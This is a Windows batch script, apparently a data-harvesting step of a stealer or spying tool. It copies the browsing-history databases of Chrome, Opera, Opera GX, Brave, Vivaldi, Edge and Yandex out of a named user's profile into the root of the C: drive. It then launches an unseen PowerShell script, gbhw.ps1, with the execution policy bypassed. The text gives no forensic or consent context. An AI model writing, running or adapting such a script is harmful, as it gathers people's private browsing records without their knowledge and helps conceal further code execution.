::Set user
set USER=user.user
:: Get Chrome history
xcopy "C:\Users\%USER%\AppData\Local\Google\Chrome\User Data\Default\History" "C:\" /Y
move "C:\History" "C:\chrome_history"
:: Get Opera history
xcopy "C:\Users\%USER%\AppData\Roaming\Opera Software\Opera Stable\History" "C:\" /Y
move "C:\History" "C:\opera_history"
:: Get Opera GX history
xcopy "C:\Users\%USER%\AppData\Roaming\Opera Software\Opera GX Stable\History" "C:\" /Y
move "C:\History" "C:\operagx_history"
:: Get Brave history
xcopy "C:\Users\%USER%\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History" "C:\" /Y
move "C:\History" "C:\brave_history"
:: Get Vivaldi history
xcopy "C:\Users\%USER%\AppData\Local\Vivaldi\User Data\Default\History" "C:\" /Y
move "C:\History" "C:\vivvaldi_history"
:: Get Edge history
xcopy "C:\Users\%USER%\AppData\Local\Microsoft\Edge\User Data\Default\History" "C:\" /Y
move "C:\History" "C:\edge_history"
:: Get Yandex history
xcopy.exe "C:\Users\%USER%\AppData\Local\Yandex\YandexBrowser\User Data\Default\History" "C:\" /Y
move "C:\History" "C:\yandex_history"

powershell -ExecutionPolicy Bypass -File gbhw.ps1
